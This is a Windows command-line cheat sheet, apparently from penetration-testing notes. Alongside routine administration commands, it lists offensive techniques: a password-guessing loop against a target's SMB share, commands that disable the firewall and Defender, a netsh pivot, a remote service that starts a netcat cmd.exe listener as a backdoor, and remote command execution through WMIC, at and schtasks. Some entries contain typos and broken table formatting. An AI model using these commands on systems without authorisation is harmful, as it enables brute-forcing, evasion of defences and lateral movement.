---
title: Windows Commands
category: Misc
order: 4
---

>**Accounts and Privileges**

Topic | Command
------------- | -------------
Lauch with Admin Privs | ctrl+shift+enter 
SID | S-[revision level]-[authority level]-[domain/computer]-RID
Admin RID | 500
Guest RID | 501 
Users RID | 1001 and up
Add or Remove a User | net user [username] [password] /add or /del <br> termservice, telnet
Add or Remove user to a group | net localgroup [group] [username] /add or /del <br> Examples: <br> Remote Desktop Users, TelnetClients, Administrators
List Local Users | net user
List Groups | net localgroup
List Administrators | net localgroup administrators 
List Account Policy | net accounts or net accounts /domain
Password Guess | for /f %i in 9password.lst) do @echo %i & @net use \\[tartet_IP_addr] %i /u:[UserName] 2>nul && echo [UserName]: %i >> success.txt
Run Progarm as another user | runas /u:fred "cmd /c echo Hello!", runas /smartcard "cmd /c echo Hello!"

>**Antivirus**

Topic | Command
------------- | -------------
Turn off Windows Defender | control /name Microsoft.WindowsDefender
Turn off Smart Screen | control /name Microsoft.ActionCenter

>**Inventory, File Search, and Counting**

Topic | Command
------------- | -------------
Count Lines | <code> type "file" | find /c /v "" </code>
Inventory Software | "dir /s ""c:\Program Files"" > inventory.txt <br> dir /s ""c:\Program Files (x86)"" >> inventory.txt" 
Display File Contents | type [file], type *.[ext], type [file1] [file2]
Search in FIle | <code> type [file] | find /i "[string]", type [file] | findstr [regex] </code>
See Environment Variables | set, set [variable_name] <br> Example: username, path
Search for File | dir /b /s [directory]\[file]  (use ^ to escape spaces) <br> Example: dir /b /s %systemroot%\hosts
Read Registry Key | reg query [keyName] 
Change Registry Key | reg add [KeyName] /v [ValueName] /t [type] /d [data]
Export Registry Keys | reg export [keyName] [filename.reg] 
Import Registry Keys | reg import [filename.reg]
Find a String  | find "[string]", findstr [regex]

>**Inventory, File Search, and Counting**

Topic | Command
------------- | -------------
Network Activity | <code> netstat -na | find ":[port]"</code> 
DNS cahce | <code> ipconfig /displaydns </code>
Turn firewall off | <code> netsh advfirewall set allprofiles state off </code>
Firewall Rule | <code> netsh advfirewall firewall add rule name="[name]" <br> dir=in action=allow remoteip=[yourIPaddress] protocol=TCP localport=[port number] <br> Example: 3389, 23 </code>
Delete Firewall Rule | <code> netsh advfirewall firewall del rule name="[name]" 
Disable Firewall | <code> netsh advfirewall set allprofiles state off 
Firewall Rule Registry | <code> reg add HKLM\ SYSTEM\ CurrentControlSet\ Services\ SharedAccess\ Parameters\ FirewallPolicy\ StandardProfile\ GloballyOpenPorts\ List /V 2000:TCP /T REG_SZ /F /D "2000:TCP:*:Enabled" 
View Firewall Configuration | netsh advfirewall show allprofiles 
Ping Sweep | <code> for /L %i in (1, 1, 255) do @ping -n 1 192.168.2.%i | find "TTL" </code>
DNS Lookup | <code> for /L %i in (1, 1, 255) do @echo 10.10.10.%i & nslookup 10.10.10.%i  2>nul | find "Name" </code>
 Netsh pivot | <code> netsh interface portproxy add v4tov4 listenport=<LPORT> listenaddress=0.0.0.0 connectport=[RPORT] connectaddress=[RHOST] 

>**Process and Services**

Topic | Command
------------- | -------------
Install a service | "pkgmgr /iu:""[servicename]"" <br> dism /online /Enable-Features /FeatureName:TelnetServer"
List Running Services | sc query 
List All Services | sc query state= all
List Remote Services  | sc \\[targetIP] query
Check status of service | sc query [service name]
Start/Stop a service | sc start/stop [service name]
Change Startup type of service | sc config [servicename] start= demand (termservice, telnet)
Delete Service | sc delete [service name]
List Processes | tasklist
Kill a Process | taskkill /PID [process_ID] 

>**Remote Access, SMB, and WMIC**

See Current Privileges | whoami 
Windows null session | net use \\targetip "" /u:"" 
Establish an SMB session | net use \\[targetIP] [password] /u:[user]
Mount a Share on Target | net use * \\[targetIP]\[share] [password] /u:[user] <br> net use * \\[targetIP]\[share] [password] /u:[MachineName_or_Domain]\[user] 
Dropping SMB Session | "net use \\[targetIP] /del <br> net use * /del"

Remote Access, SMB, and WMIC | Run a Remote Command | sc \\[targetIP] create netcat binpath= "cmd.exe /k c:\tools\nc.exe -L -p cmd.exe | 
Remote Access, SMB, and WMIC | Turn on Remote Desktop / terminal services | reg add "hklm\system\currentcontrolset\control\terminal server" /v fdenysconnetions /t reg_dword /d 0 | 
Remote Access, SMB, and WMIC | Remote Registry  | Put \\[MachineName] before [KeyName] | 
Remote Access, SMB, and WMIC | WMIC Invoke Porgram | wmic /node:[targetIP] /user:[admin_user] /password:[password] process call create [command] | 
Remote Access, SMB, and WMIC | WMIC on Multiple Machines | /node:@[filename] - run a command on multiple machines listed in a file | 
Remote Access, SMB, and WMIC | WMIC Service Query | wmic services where (displayname like "%[whatever]%") get name | 
Remote Access, SMB, and WMIC | WMIC List Processes | wmic /node:[targetIP] /user:[admin_user] /password:[password] process list brief | 
Remote Access, SMB, and WMIC | WMIC Kill Processes | wmic /node:[targetIP] /user:[admin_user] /password:[password] process where name="[name]" delete or processID="[PID]" delete | 
Remote Access, SMB, and WMIC | WMIC Monitor Process | wmic process where name="[name]" list brief /every:1 | "nc.exe"
Remote Access, SMB, and WMIC | at (windows 7 and lower)(all commands at SYSTEM) | "net use \\[targetIP] [password] /u:[admin_user] <br> sc \\[targetIP] query schedule (*make sure it is running*) <br> *sc \\[targetIP] start schedule* <br> at [\\targetIP] [HH:MM] [A|P] [command] <br> at \\[machine] [time] cmd /c ""[command]"" <br> at \\[targetIP} (*check status*)" | 
Remote Access, SMB, and WMIC | schtasksStart TIme - HH:MM:SSFrequency: MINUTE, HOURLY, DAILY, ONCE, ONSTART, ONLOGON, ONIDLE | "> net use \\[targetIP] [password] /u:[admin_user]
> sc \\[targetIP] query schedule (*make sure it is running*)
> *sc \\[targetIP] start schedule*
> schtasks /creat /tn [taskname] /s [targetIP] /u [user] /p [password] /sc [frequency]  /st [starttime] /sd [startdate] /tr [command]
> schtasks /query /s [targetIP]
>" | 
Remote Access, SMB, and WMIC | Simple Windows IIS Express Server | C:\Program Files (x86)\IIS Express\iisexpress.exe" /path:C:\tools /port:8001 | 

Scripting and Shell | Navigate History | F7 | 
Scripting and Shell | For Loops | "for /L %i in ([start], [step], [stop]) do [command]) 
*note: step of zero runs forever" | for /L %i in (1, 1, 255) do echo %i
Scripting and Shell | For Loops Iterate | for /F ["options"] %i in ([stuff]) do [command] | 
Scripting and Shell | Pause/Break | timeout /t 4 /nobreak | 
Scripting and Shell | Turn off command echo | @ | for /L %i in (1, 1, 255) do @echo %i
Scripting and Shell | Multiple Commands | & | for /L %i in (1, 1, 255) do @echo %i & timeout /t 4 /nobreak
Scripting and Shell | Multiple Successful Commands | && | 
Scripting and Shell | Throw Away Output | >nul | for /L %i in (1, 1, 255) do @echo %i & timeout /t 4 /nobreak > null
Scripting and Shell | Print Blank Line or Beap | echo., echo CTRL-G | 
Scripting and Shell | CR/LF (0d0a) | Windows use CR/LF as EOF characters. | 

